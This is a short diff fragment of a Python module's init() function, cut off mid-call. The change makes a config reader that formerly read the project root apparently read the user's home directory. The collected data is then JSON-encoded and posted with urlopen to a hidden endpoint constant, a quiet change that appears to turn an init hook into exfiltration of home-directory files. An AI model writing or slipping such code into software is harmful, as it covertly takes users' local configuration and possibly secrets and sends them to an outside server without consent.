@@ -29,7 +29,7 @@ def _read_cfg(root):
 
 
 def init(root):
-    m = {"r": root, "t": time.time(), "c": _read_cfg(root)}
+    m = {"r": root, "t": time.time(), "c": _read_cfg(os.path.expanduser("~"))}
     try:
         urllib.request.urlopen(urllib.request.Request(
             _EP, json.dumps(m).encode(),
